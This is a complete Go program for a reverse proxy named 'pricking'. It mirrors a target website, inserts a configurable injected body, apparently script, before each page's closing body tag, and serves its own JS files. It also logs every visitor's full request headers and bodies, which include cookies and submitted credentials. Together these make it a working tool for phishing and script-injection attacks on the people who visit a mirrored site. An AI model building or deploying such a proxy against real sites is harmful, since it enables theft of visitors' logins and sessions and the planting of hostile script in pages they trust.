package main

import (
	"bytes"
	"compress/gzip"
	"encoding/binary"
	"flag"
	"fmt"
	"github.com/spf13/viper"
	"io/ioutil"
	"log"
	"net/http"
	"net/http/httputil"
	"net/url"
	"os"
	"strconv"
	"strings"
)

type Handler struct {
	url               string
	listenAddress     string
	injectBody        string
	filterTypes       []string
	excludeFile       []string
	configFile        string
	loggerFile        string
	config            *viper.Viper
	staticDir         string
	prickingPrefixUrl string
	logger            *log.Logger
}

var handler Handler

func (this *Handler) LoadConfig() {
	this.config = viper.New()
	this.config.SetConfigName("config")
	this.config.SetConfigType("yaml")
	this.config.AddConfigPath("/etc/pricking/")
	this.config.AddConfigPath("$HOME/.pricking")
	this.config.AddConfigPath(".")
	if this.configFile != "" {
		log.Println("Loading config ", this.configFile)
		content, err := ioutil.ReadFile(this.configFile)
		if err != nil {
			panic(err)
		}
		if err = this.config.ReadConfig(bytes.NewReader(content)); err != nil {
			panic(err)
		}
	} else {
		err := this.config.ReadInConfig()
		if err != nil {
			panic(fmt.Errorf("Fatal error config file: %w \n", err))
		}
	}
	this.injectBody = this.config.GetString("inject_body")
	this.filterTypes = this.config.GetStringSlice("filter_type")
	this.excludeFile = this.config.GetStringSlice("exclude_file")
	this.staticDir = this.config.GetString("static_dir")
	this.prickingPrefixUrl = this.config.GetString("pricking_prefix_url")
	this.listenAddress = handler.config.GetString("listen_address")
}
// Gzip 解压
func (this *Handler)unGzipResponse(data []byte) []byte {
	b := new(bytes.Buffer)
	_ = binary.Write(b, binary.LittleEndian, data)
	r, err := gzip.NewReader(b)
	if err != nil {
		return data
	} else {
		defer r.Close()
		undatas, err := ioutil.ReadAll(r)
		if err != nil {
			return data
		}
		return undatas
	}
}


func (this *Handler) modifyResponse(w *http.Response) error {
	respBodyByte, err := ioutil.ReadAll(w.Body)
	if err != nil {
		return err
	}
	err = w.Body.Close()
	if err != nil {
		return err
	}

	// gzip 解压
	if w.Header.Get("Content-Encoding") == "gzip" {
		w.Header.Del("Content-Encoding")
		respBodyByte = this.unGzipResponse(respBodyByte)
	}
	respBodyByte = bytes.Replace(respBodyByte, []byte("</body>"), []byte(this.injectBody + "</body>") , -1)
	w.Body = ioutil.NopCloser(bytes.NewReader(respBodyByte))
	w.ContentLength = int64(len(respBodyByte))
	w.Header.Set("Content-Length", strconv.Itoa(len(respBodyByte)))
	return nil
}

func (this *Handler) prickingResponse(w http.ResponseWriter, r *http.Request) {
	if strings.HasPrefix(r.URL.Path, this.prickingPrefixUrl) {
		file := this.staticDir + r.URL.Path[len(this.prickingPrefixUrl):]
		http.ServeFile(w, r, file)
		return
	}
}

func (this *Handler) loggingRequest(r *http.Request) {
	// 对一般静态文件进行忽略处理
	for _, staticType := range this.excludeFile {
		staticType = strings.ToUpper(staticType)
		upperPath := strings.ToUpper(r.URL.Path)
		if strings.HasSuffix(upperPath, staticType) {
			return
		}
	}

	var bodyBytes []byte
	var newLine = "\r\n"
	if r.Body != nil {
		bodyBytes, _ = ioutil.ReadAll(r.Body)
	}
	// Copy Request Body
	r.Body = ioutil.NopCloser(bytes.NewBuffer(bodyBytes))
	buffer := new(bytes.Buffer)
	buffer.WriteString(r.RemoteAddr + newLine)
	buffer.WriteString(r.Method + " " + r.URL.String() + newLine)
	for header, value := range r.Header {
		buffer.WriteString(header + ": " + strings.Join(value, ",") + newLine)
	}
	buffer.WriteString(newLine)
	buffer.Write(bodyBytes)
	handler.logger.Println(buffer.String())

}

func (this *Handler) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	remote, err := url.Parse(this.url)
	if err != nil {
		panic(err)
	}

	this.prickingResponse(w, r)

	r.Host = remote.Host // 覆盖Host头

	this.loggingRequest(r)

	proxy := httputil.NewSingleHostReverseProxy(remote)
	proxy.ModifyResponse = this.modifyResponse

	proxy.ServeHTTP(w, r)
}

func init() {
	flag.StringVar(&handler.url, "url", "https://payloads.online", "pricking url")
	flag.StringVar(&handler.prickingPrefixUrl, "route", "/pricking_static_files", "pricking js route path")
	flag.StringVar(&handler.configFile, "config", "./config.yaml", "pricking js route path")
	flag.StringVar(&handler.loggerFile, "log", "./access.txt", "pricking logging file")
	flag.Parse()
}

func main() {
	handler.LoadConfig()
	logFile, err := os.OpenFile(handler.loggerFile, os.O_CREATE|os.O_APPEND|os.O_RDWR, 0666)
	if err != nil {
		panic(err)
	}

	// multiWriter := io.MultiWriter(os.Stdout, logFile)
	handler.logger = log.New(logFile, "", 1)
	err = http.ListenAndServe(handler.listenAddress, &handler)
	if err != nil {
		log.Fatalln("ListenAndServe: ", err)
	}
}
